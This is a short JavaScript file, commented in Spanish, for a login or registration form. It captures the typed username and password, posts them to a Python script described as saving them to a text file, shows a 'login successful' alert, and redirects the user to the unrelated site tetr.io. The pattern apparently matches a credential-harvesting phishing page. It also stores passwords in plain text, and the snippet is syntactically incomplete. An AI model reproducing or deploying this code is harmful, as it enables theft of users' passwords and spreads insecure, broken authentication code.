document.addEventListener("DOMContentLoaded", function() {
    // Tu código JavaScript aquí
  
    document.getElementById("register-form").addEventListener("submit", function(event) {
      event.preventDefault(); // Evitar el envío del formulario
  
      var username = document.getElementById("username").value;
      var password = document.getElementById("password").value;
  
      // Resto del código...
      
    // Aquí puedes realizar validaciones adicionales si es necesario
  
    // Envío de datos a Python para guardar en archivo de texto
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "save_login.py", true);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function() {
      if (xhr.readyState === 4 && xhr.status === 200) {
        alert("Inicio de sesión exitoso");
        window.location.href = "https://tetr.io"; // Redirigir a la página tetr.io
      } else if (xhr.readyState === 4 && xhr.status !== 200) {
        alert("Error al iniciar sesión. Por favor, intenta nuevamente.");
      }
    };
    xhr.send("username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password));
 });

